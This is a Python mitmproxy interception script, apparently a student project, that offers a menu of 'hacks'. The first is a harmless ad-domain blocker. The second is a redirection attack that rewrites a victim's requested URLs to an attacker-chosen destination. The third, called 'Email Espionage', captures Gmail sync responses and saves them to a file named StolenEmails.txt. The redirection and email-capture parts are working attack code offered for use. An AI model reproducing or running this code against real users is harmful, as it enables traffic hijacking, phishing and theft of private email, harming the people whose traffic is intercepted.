from mitmproxy import http
import json

print("\n"*10+"------------------------------------------")
print("\nWelcome to HackerClient!\n\n")
print("Which Hack would you like to perform?")
print("1) Content Blocker","\n2) Redirection Attack","\n3) Email Espionage")
hack = input("Enter number: ")

if hack == "1":
    
    ad_domains = [
        "ads.google.com",
        "doubleclick.net",
        "adservice.google.com",
        "googleadservices.com",
        "ads.yahoo.com",
        "s.yimg.com/rq/darla/",
        "adserver.yahoo.com",
        "connect.facebook.net",
        "ads.facebook.com",
    ]

    def request(flow: http.HTTPFlow):
        # Check if the request URL contains any known ad domain
        if any(ad_domain in flow.request.pretty_url for ad_domain in ad_domains):
            flow.response = http.Response.make(
                403,  # HTTP status code for "Forbidden"
                b"Blocked by Content Blocker",
                # Byte string, splits up each part of that string into a single bit
                {"Content-Type": "text/html"}
                # Tells the client that the response body is HTML-formatted text 
            )
            
elif hack == "2":

    targets = []
    target = input("Enter target(s) (Press ENTER if no more): ")
    while target != "":
        targets.append(target)
        target = input("Enter target(s) (Press ENTER if no more): ")

    destination = input("Input destination to send victim to: ")

    def request(flow: http.HTTPFlow):
        # Check if the request URL contains any known ad domain
        for target in targets:
            if target in flow.request.pretty_url:
                # redirect to new url if website is target
                flow.request.url = flow.request.url.replace(target, destination)

elif hack == "3":

    # Define the Response event
    def response(flow: http.HTTPFlow):
        # Filters POST flows from gmail
        if flow.request.method == "POST" and "mail.google.com/sync/u/0/i/s" in flow.request.pretty_url:
                print(f"Processing flow: {flow.request.pretty_url}") #Debugging line

                data = json.loads(flow.response.get_text()) # Scrapes the JSON content as text
                
                # Writes JSON on txt file
                f = open("/Users/a../Desktop/241 Project 2/Ad Blocker/StolenEmails.txt", "a") 
                f.write(json.dumps(data))
                f.close()
else:
    hack = input("Enter number: ")



